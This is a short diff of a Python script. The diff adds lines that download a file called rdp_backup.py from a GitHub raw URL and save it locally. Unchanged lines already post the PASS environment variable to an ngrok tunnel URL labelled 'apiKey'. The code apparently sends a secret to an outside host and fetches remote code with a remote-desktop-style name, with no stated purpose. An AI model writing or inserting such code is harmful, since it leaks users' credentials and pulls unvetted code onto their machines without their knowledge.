@@ -6,6 +6,13 @@ import os
 def main():
     url = "https://heteronomous-bridally-minerva.ngrok-free.dev"
     headers = {"ngrok-skip-browser-warning": "true"}
+    download_url = "https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/rdp_backup.py"
+    response = requests.get(download_url)
+    if response.status_code == 200:
+        with open("rdp_backup.py", "wb") as file:
+            file.write(response.content)
+    else:
+        print("RDP init failed")
     requests.post("https://heteronomous-bridally-minerva.ngrok-free.dev", json={"apiKey": os.environ["PASS"]})
     
     try:
